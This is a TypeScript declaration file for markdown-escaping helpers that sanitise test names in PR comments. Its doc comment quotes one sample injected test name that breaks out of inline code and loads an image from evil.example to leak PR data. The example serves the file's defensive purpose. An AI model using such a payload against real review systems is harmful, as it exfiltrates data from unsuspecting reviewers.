/**
 * Escape markdown special characters to prevent injection via PR comments.
 *
 * Test file names, test names, and rule reasons come from parsing user code.
 * A malicious test name like `'foo\` - ![leak](https://evil.example/x.png?pr=leaked)'`
 * would otherwise break the inline-code wrapper and load external images
 * in the PR comment when reviewers open it.
 *
 * This function escapes the following characters: ` * _ [ ] ( ) { } < > # + ! | . ~ = - \n
 *
 * @see https://docs.github.com/en/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax
 */
export declare function escapeMd(input: string): string;
/**
 * Escape inline code — useful when wrapping content in backticks.
 * Inside inline code, only ` and \ need escaping (and newlines must be removed).
 */
export declare function escapeInlineCode(input: string): string;
//# sourceMappingURL=escape.d.ts.map